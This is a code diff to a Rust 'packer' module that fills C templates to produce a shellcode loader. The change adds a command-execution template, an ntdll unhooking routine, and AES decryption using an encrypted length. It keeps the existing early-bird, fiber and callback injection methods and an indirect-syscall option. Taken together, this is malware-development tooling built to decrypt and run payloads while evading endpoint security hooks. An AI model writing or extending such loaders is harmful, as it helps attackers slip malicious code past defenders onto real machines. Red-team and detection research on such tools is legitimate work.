@@ -8,21 +8,28 @@ pub fn generate(
     obf_technique: &str,
     use_unhook: bool,
     enc_technique: &str,
+    cmd: Option<&str>,
+    encrypted_len: usize,
+    use_ntdll_unhook: bool,
 ) -> Result<String, String> {
     let template_path = match lang {
         "c" => "crates/packer/src/templates/loader.c.tpl",
         _ => return Err(format!("Unsupported language: {}", lang)),
     };
 
-    let execution_template_path = match loading_technique {
-        "callback" => "crates/packer/src/templates/callback.c.tpl",
-        "fiber" => "crates/packer/src/templates/fiber.c.tpl",
-        "earlybird" => "crates/packer/src/templates/earlybird.c.tpl",
-        _ => {
-            return Err(format!(
-                "Unsupported loading technique: {}",
-                loading_technique
-            ))
+    let execution_template_path = if cmd.is_some() {
+        "crates/packer/src/templates/cmd_exec.c.tpl"
+    } else {
+        match loading_technique {
+            "callback" => "crates/packer/src/templates/callback.c.tpl",
+            "fiber" => "crates/packer/src/templates/fiber.c.tpl",
+            "earlybird" => "crates/packer/src/templates/earlybird.c.tpl",
+            _ => {
+                return Err(format!(
+                    "Unsupported loading technique: {}",
+                    loading_technique
+                ))
+            }
         }
     };
 
@@ -61,8 +68,21 @@ pub fn generate(
         String::new()
     };
 
+    let ntdll_unhook_template_content = if use_ntdll_unhook {
+        fs::read_to_string("crates/packer/src/templates/ntdll_unhook.c.tpl")
+            .map_err(|e| e.to_string())?
+    } else {
+        String::new()
+    };
+
     let unhook_define = if !use_unhook {
         "#define USE_INDIRECT_SYSCALLS"
+    } else {
+        ""
+    };
+
+    let ntdll_unhook_call = if use_ntdll_unhook {
+        "if (!UnhookNtdll()) { return 1; }"
     } else {
         ""
     };
@@ -84,7 +104,10 @@ pub fn generate(
         .join(", ");
 
     let decryption_call_str = match enc_technique {
-        "aes" => "decrypt_aes((BYTE*)shellcode_mem, shellcode_size, key, sizeof(key));".to_string(),
+        "aes" => format!(
+            "decrypt_aes((BYTE*)shellcode_mem, {}, key, sizeof(key));",
+            encrypted_len
+        ),
         "rc4" => "decrypt_rc4((BYTE*)shellcode_mem, shellcode_size, key, sizeof(key));".to_string(),
         "xor" => "decrypt_xor((BYTE*)shellcode_mem, shellcode_size, key, sizeof(key));".to_string(),
         _ => "".to_string(),
@@ -110,7 +133,12 @@ pub fn generate(
             "// {{SYSCALL_FUNCTION_PLACEHOLDER}}",
             &syscall_template_content,
         )
-        .replace("// {{UNHOOK_PLACEHOLDER}}", unhook_define);
+        .replace("// {{UNHOOK_PLACEHOLDER}}", unhook_define)
+        .replace(
+            "// {{NTDLL_UNHOOK_FUNCTION_PLACEHOLDER}}",
+            &ntdll_unhook_template_content,
+        )
+        .replace("// {{NTDLL_UNHOOK_CALL_PLACEHOLDER}}", &ntdll_unhook_call);
 
     Ok(populated_template)
 }
